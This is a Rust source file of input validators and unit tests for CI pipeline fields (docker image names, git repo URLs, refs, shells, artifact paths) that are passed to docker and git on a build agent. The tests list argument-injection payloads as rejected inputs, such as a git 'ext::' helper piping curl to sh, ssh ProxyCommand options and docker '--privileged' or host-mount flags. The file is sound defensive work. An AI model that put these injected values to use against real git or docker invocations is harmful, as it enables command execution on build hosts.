//! Grammar for definition fields that become arguments to a process on the agent host.
//!
//! A step's `image:` is passed to `docker run`, and `workspace.repo` to `git remote add`.
//! Both are written by whoever can edit a pipeline, which is a project writer, and both
//! programs will happily read an unexpected value as an option or a transport. These checks
//! run when the pipeline compiles, so the author gets a legible error, and again on the
//! agent right before use, so a snapshot written by an older server cannot get past. The
//! agent is the boundary; the compile-time check is the courtesy.

/// A Docker image reference: `[registry[:port]/][path/]name[:tag][@algo:hex]`.
///
/// The property that matters is that nothing here can be read as a `docker run` flag or
/// as a second argument: no leading `-`, no whitespace, no shell metacharacters. The rest
/// follows the reference grammar closely enough to reject typos early.
pub fn image_reference_ok(s: &str) -> bool {
    if s.is_empty() || s.len() > 255 {
        return false;
    }
    let (name, digest) = match s.split_once('@') {
        Some((n, d)) => (n, Some(d)),
        None => (s, None),
    };
    if let Some(d) = digest {
        let Some((algo, hex)) = d.split_once(':') else {
            return false;
        };
        if algo.is_empty() || !algo.chars().all(|c| c.is_ascii_alphanumeric()) {
            return false;
        }
        if hex.len() < 32 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
            return false;
        }
    }
    if !name.starts_with(|c: char| c.is_ascii_alphanumeric()) {
        return false;
    }
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':'))
    {
        return false;
    }
    if name.contains("//") || name.ends_with('/') || name.ends_with(':') {
        return false;
    }
    // The last path segment carries at most one `:` (the tag); a registry port is the only
    // other place a colon belongs, and that is never the last segment.
    let last = name.rsplit('/').next().unwrap_or(name);
    !last.is_empty() && last.matches(':').count() <= 1
}

/// A place `git` may fetch from: an `http(s)://`, `ssh://`, `git://`, or `file://` URL, an
/// scp-like `user@host:path`, or a filesystem path.
///
/// What is refused is anything git would treat as a transport helper or an option:
/// `ext::<command>` runs the command, `fd::<n>` reuses a descriptor, and a leading `-` on
/// the URL, a user, or a host is an argument to git or to ssh. The agent additionally pins
/// `GIT_ALLOW_PROTOCOL`, so a value this lets through still cannot reach a helper git
/// would otherwise honour.
pub fn repo_url_ok(s: &str) -> bool {
    let s = s.trim();
    if s.is_empty() || s.len() > 2048 || s.starts_with('-') {
        return false;
    }
    if s.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return false;
    }
    // git reads `<helper>::<address>` as a remote-helper invocation when the run of
    // scheme characters at the very start is followed by `::`. Only that position
    // matters: the `::` inside an IPv6 literal (`https://[2001:db8::1]/repo`) is not one.
    let scheme_len = s
        .bytes()
        .take_while(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'.' | b'-'))
        .count();
    if s[scheme_len..].starts_with("::") {
        return false;
    }
    let authority = match s.split_once("://") {
        Some((scheme, rest)) => {
            if rest.is_empty()
                || !matches!(
                    scheme.to_ascii_lowercase().as_str(),
                    "http" | "https" | "ssh" | "git" | "file"
                )
            {
                return false;
            }
            rest.split('/').next().unwrap_or("")
        }
        // scp-like `user@host:path`, or a plain path: whatever precedes the first `/` is
        // the part git may hand to ssh.
        None => s.split('/').next().unwrap_or(""),
    };
    // Neither a user nor a host may begin with `-`: `ssh://-oProxyCommand=…@host/` is an
    // ssh option, whatever git's own guard against it does.
    !authority
        .split(['@', ':'])
        .any(|piece| piece.starts_with('-'))
}

/// A full commit id: 40 hex characters (SHA-1) or 64 (SHA-256).
///
/// The agent passes it to `git checkout` *before* the `--`, where a value starting with
/// `-` would be read as an option. Hex never starts with one.
pub fn commit_sha_ok(s: &str) -> bool {
    matches!(s.len(), 40 | 64) && s.chars().all(|c| c.is_ascii_hexdigit())
}

/// A ref safe to hand to `git fetch`: no leading `-`, no `..`, whitespace, control
/// characters, or the revision syntax (`~ ^ : ?`) that would make it something other
/// than one ref.
pub fn git_ref_ok(r: &str) -> bool {
    !r.is_empty()
        && r.len() <= 255
        && !r.starts_with('-')
        && !r.contains("..")
        && !r.contains(char::is_whitespace)
        && !r
            .chars()
            .any(|c| c.is_control() || matches!(c, '~' | '^' | ':' | '?'))
}

/// A step's `working_directory`: a path that stays inside the workspace when joined to
/// it. No absolute path, no `..` in any position, no Windows root or drive.
pub fn working_directory_ok(p: &str) -> bool {
    let p = p.trim();
    !p.is_empty()
        && !p.starts_with('/')
        && !p.starts_with('\\')
        && !p.contains(':')
        && !p.split(['/', '\\']).any(|seg| seg == "..")
}

/// A step's `shell`: a bare program name, not a command line — `bash`, never
/// `/bin/bash`, `bash -e`, or anything starting with `-`. The agent runs `<shell> -c <run>`.
pub fn shell_ok(s: &str) -> bool {
    let s = s.trim();
    !s.is_empty()
        && s.len() <= 32
        && !s.starts_with('-')
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
        && s != "."
        && s != ".."
}

/// A workspace-relative artifact path: one or more plain path components, nothing else.
///
/// The agent reads a declared artifact from, and writes a restored one to,
/// `work_dir.join(path)` on the host. An absolute path makes `join` discard the workspace,
/// and `..` climbs out of it; a leading `./` is refused too, because the upload side has
/// always refused it and a name that cannot be uploaded should not compile. Symlinks the
/// checkout plants are a separate question, answered on the agent where the files are.
pub fn artifact_path_ok(s: &str) -> bool {
    if s.is_empty() || s.len() > 1024 || s.chars().any(char::is_control) {
        return false;
    }
    let mut components = std::path::Path::new(s).components().peekable();
    components.peek().is_some() && components.all(|c| matches!(c, std::path::Component::Normal(_)))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_working_directory_stays_inside_the_workspace() {
        for good in ["apps/ui", "sub", "a/b/c", " padded "] {
            assert!(working_directory_ok(good), "rejected {good:?}");
        }
        for bad in [
            "",
            "/etc",
            "\\\\server\\x",
            "C:\\x",
            "../up",
            "a/../../b",
            "a\\..\\b",
        ] {
            assert!(!working_directory_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_shell_is_a_bare_program_name() {
        for good in ["sh", "bash", "python3", "pwsh-7.4"] {
            assert!(shell_ok(good), "rejected {good:?}");
        }
        for bad in [
            "",
            "/bin/bash",
            "bash -e",
            "bash;rm",
            "-i",
            "--login",
            ".",
            "..",
            &"x".repeat(33),
        ] {
            assert!(!shell_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_commit_sha_is_forty_or_sixty_four_hex_characters() {
        assert!(commit_sha_ok(&"a".repeat(40)));
        assert!(commit_sha_ok(&"0123456789abcdef".repeat(4)));
        for bad in [
            "",
            "abc123",
            "--pathspec-from-file=/etc/passwd",
            &"g".repeat(40),
            &"a".repeat(41),
        ] {
            assert!(!commit_sha_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_git_ref_cannot_be_an_option_or_a_revision_expression() {
        for good in ["main", "release/1.x", "refs/pull/12/head", "v1.0.0"] {
            assert!(git_ref_ok(good), "rejected {good:?}");
        }
        for bad in [
            "",
            "-oops",
            "--upload-pack=x",
            "a..b",
            "main~1",
            "HEAD^",
            "src:dst",
            "has space",
            "new\nline",
        ] {
            assert!(!git_ref_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn artifact_paths_that_leave_the_workspace_are_refused() {
        for bad in [
            "",
            "/etc/passwd",
            "../outside",
            "out/../../x",
            "./dist/app.tar",
            ".",
            "out/\nfile",
            "out/\0file",
        ] {
            assert!(!artifact_path_ok(bad), "accepted {bad:?}");
        }
        assert!(!artifact_path_ok(&"a/".repeat(600)));
    }

    #[test]
    fn plain_relative_artifact_paths_are_accepted() {
        for good in [
            "VERSION",
            "dist/app.tar",
            "out/nested/dir/file.log",
            "target/release/fiber-agent",
            ".hidden/file",
            "a//b",
            "dir/",
        ] {
            assert!(artifact_path_ok(good), "rejected {good:?}");
        }
    }

    #[test]
    fn image_references_that_are_really_docker_flags_are_refused() {
        for bad in [
            "",
            "-v/:/host",
            "--privileged",
            "-it",
            "ubuntu --privileged",
            " ubuntu",
            "ubuntu:",
            "ubuntu/",
            "ubuntu:1:2",
            "reg//img",
            "img@sha256",
            "img@sha256:zz",
            "img@sha256:abc",
            "a b",
            "a;b",
            "$(x)",
        ] {
            assert!(!image_reference_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn ordinary_image_references_are_accepted() {
        for good in [
            "ubuntu",
            "ubuntu:22.04",
            "rust:1.98-bookworm",
            "ghcr.io/example/fiber-agent:latest",
            "localhost:5000/team/img:dev",
            "docker.io/library/node:22-alpine",
            "img@sha256:6a1f3c0f4b9d4c3a2e1d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7",
            "img:1.0@sha256:6a1f3c0f4b9d4c3a2e1d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7",
            "a_b.c-d",
        ] {
            assert!(image_reference_ok(good), "rejected {good:?}");
        }
    }

    #[test]
    fn repo_urls_that_would_run_a_command_are_refused() {
        for bad in [
            "",
            "-",
            "--upload-pack=touch /tmp/x",
            "ext::sh -c 'curl x|sh'",
            "ext::sh",
            "fd::17",
            "foo::bar",
            "::x",
            "ftp://host/repo",
            "javascript://x",
            "https://host/repo with space",
            "https://host/re\npo",
            "ssh://-oProxyCommand=x@host/repo",
            "ssh://git@-oProxyCommand=x/repo",
            "-oProxyCommand=x@host:repo",
            "git@-host:repo",
        ] {
            assert!(!repo_url_ok(bad), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_double_colon_that_is_not_a_helper_prefix_is_fine() {
        assert!(repo_url_ok("https://[2001:db8::1]/org/repo.git"));
        assert!(repo_url_ok("ssh://git@[fe80::1]:2222/org/repo.git"));
        assert!(repo_url_ok("https://host/path/with::colons"));
    }

    #[test]
    fn ordinary_repo_urls_are_accepted() {
        for good in [
            "https://github.com/octocat/Hello-World.git",
            "http://gitea.internal/org/repo",
            "https://user:token@github.com/org/repo.git",
            "ssh://git@github.com/org/repo.git",
            "git://host/repo.git",
            "git@github.com:org/repo.git",
            "file:///srv/git/repo.git",
            "/srv/git/repo.git",
            "./local",
        ] {
            assert!(repo_url_ok(good), "rejected {good:?}");
        }
    }
}
